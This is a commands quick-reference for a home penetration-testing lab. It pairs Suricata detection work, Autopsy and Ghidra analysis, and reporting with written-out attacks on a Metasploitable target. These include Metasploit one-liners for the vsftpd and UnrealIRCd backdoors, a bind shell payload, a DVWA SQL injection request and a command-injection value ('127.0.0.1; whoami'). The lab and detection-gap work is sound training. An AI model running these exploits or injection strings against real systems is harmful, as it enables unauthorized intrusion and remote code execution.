# RedSentry — Commands Quick Reference

Only commands actually used and verified working in this project are listed here.
Where something failed or required troubleshooting, that's noted inline rather than
omitted — the failures are as instructive as the successes.

---

## Lab Startup

```bash
sudo systemctl start suricata
sudo systemctl status suricata
export TARGET="192.168.128.8"
echo $TARGET   # always verify — this resets in every new terminal session
```

## Suricata

```bash
# Validate rule syntax (run after any rule edit)
sudo suricata -T -c /etc/suricata/suricata.yaml --no-random

# Watch alerts live (run in a dedicated terminal)
sudo tail -f /var/log/suricata/fast.log | grep "REDSENTRY"

# Check whether a specific rule fired
sudo grep -E "9000007|9000008" /var/log/suricata/fast.log

# Restart after config/rule changes
sudo systemctl restart suricata
```

## Exploitation (Metasploit)

```bash
# vsftpd 2.3.4 backdoor
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET; run; exit"

# UnrealIRCd backdoor
# Note: reverse payloads had connectivity issues in this environment;
# bind_perl worked reliably where reverse shells did not.
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS $TARGET; set PAYLOAD cmd/unix/bind_perl; run; exit"

# Check active sessions
sessions -l
sessions -i <id>
```

## Web Application Testing (DVWA)

```bash
# Authenticate and capture session cookie
curl -s -c ~/dvwa_cookies.txt -d "username=admin&password=password&Login=Login" \
  http://$TARGET/dvwa/login.php -o /tmp/login_result.html

# Lower DVWA security level (a legitimate DVWA training feature, not a bypass)
curl -s -b ~/dvwa_cookies.txt -c ~/dvwa_cookies.txt \
  -d "security=low&seclev_submit=Submit" http://$TARGET/dvwa/security.php

# SQL injection test
# Payload must match the Suricata rule pattern exactly if testing detection
# alongside exploitation - "OR 1=1" literal, not "OR '1'='1'"
curl -s -b ~/dvwa_cookies.txt \
  "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1+OR+1%3D1&Submit=Submit"

# Command injection test
# Must be sent as POST - this DVWA version's exec page does not accept GET.
# Note: Suricata rule 9000008 only inspects http.uri, so this exploit succeeds
# but will NOT trigger the rule - a confirmed, documented detection gap.
curl -s -b ~/dvwa_cookies.txt --data-urlencode "ip=127.0.0.1; whoami" \
  -d "submit=submit" http://$TARGET/dvwa/vulnerabilities/exec/
```

## Forensics (Autopsy)

```bash
# Launch Autopsy - must run with sudo, log-write permissions fail otherwise
sudo autopsy

# Build a synthetic disk image from collected evidence
# (no direct memory/disk capture was possible from UTM on Apple Silicon -
# this packages evidence files into a real filesystem for Autopsy to analyse)
dd if=/dev/zero of=~/redsentry/evidence.img bs=1M count=100
mkfs.ext4 ~/redsentry/evidence.img
sudo mount -o loop ~/redsentry/evidence.img /tmp/evidence-mount
sudo cp ~/redsentry/06-forensics/*.txt /tmp/evidence-mount/
sudo umount /tmp/evidence-mount
```

## Malware Analysis (Ghidra + Cross-Compilation)

```bash
# Launch Ghidra
ghidra &

# Compile natively on the analysis workstation (ARM64) - does NOT run on the
# target, included here only to show the starting point of the compatibility
# chain documented below
gcc -o redsentry-stub redsentry-stub.c

# Cross-compilation attempts made during this project, each failing for a
# different, diagnosed reason (full detail in phase04-malware/dynamic-analysis/):
x86_64-linux-gnu-gcc -o redsentry-stub-x86_64 redsentry-stub.c
  # -> ENOEXEC: target runs a 32-bit kernel, not x86_64

i686-linux-gnu-gcc -m32 -o redsentry-stub-i386 redsentry-stub.c
  # -> "version GLIBC_2.34 not found": toolchain's glibc is ~15 years newer
  #    than the target's

i686-linux-gnu-gcc -m32 -static -o redsentry-stub-i386-static redsentry-stub.c
  # -> SIGSEGV after an ENOSYS syscall: kernel ABI mismatch even with
  #    static linking

# What actually worked: compile the source directly ON Metasploitable using
# its own native toolchain, sidestepping every mismatch above at once
gcc -o /tmp/stub /tmp/stub.c

# Dynamic analysis
strace /tmp/stub 2>&1 | tee /tmp/strace-output.txt
```

## File Transfer (Kali <-> Metasploitable)

```bash
# No Meterpreter session was available in this project (session-upgrade
# attempts from a raw shell repeatedly failed), so files were moved via a
# simple HTTP server instead of upload/download.

# On Kali:
python3 -m http.server 8000

# On Metasploitable:
wget http://192.168.128.7:8000/<file> -O /tmp/<file>
```

## AI Reporting

```bash
cd ~/redsentry && python3 redsentry-reporter.py

# Cheap syntax check before spending API calls on a broken script
python3 -m py_compile ~/redsentry/redsentry-reporter.py

cat ~/redsentry/08-reports/PENTEST-REPORT.md | head -100
```

## SIEM Pipeline (Kibana / Elasticsearch - used for Phase 02 alert viewing)

```bash
sudo systemctl status elasticsearch
sudo systemctl status kibana

# Confirm Kibana is actually serving requests, not just "running" -
# the systemd service reports active long before Kibana finishes
# initialising and starts responding to HTTP
curl -I http://localhost:5601

# Watch startup if Kibana is slow to come up
sudo journalctl -u kibana -f
```

## GitHub Portfolio

```bash
cd ~/redsentry-portfolio
git add .
git status
git commit -m "Update"
git push

# Verify no sensitive files were committed
git ls-files | grep -i "shadow\|passwd\|redsentry-stub$"
```

## Resetting Metasploitable to a Clean State

No UTM snapshot workflow was established during this project - there is currently no
baseline snapshot to restore to. If a clean-state reset is needed in future work,
take a snapshot in UTM before further testing rather than assuming one exists.

---

## Explicitly Not Used in This Project

The following tools appear in some RedSentry-style guides but were not part of this
build and are intentionally omitted above rather than included as unverified reference:

- **Volatility 3** - attempted; not usable, since UTM on Apple Silicon exposes QEMU's
  monitor interface only via a Spice virtual channel, not a socket Volatility can
  attach to. See `phase03-forensics/memory-analysis/` for the full writeup and the
  manual-analysis substitute that was used instead.
- **Auditbeat / Metricbeat** - not deployed in this lab.
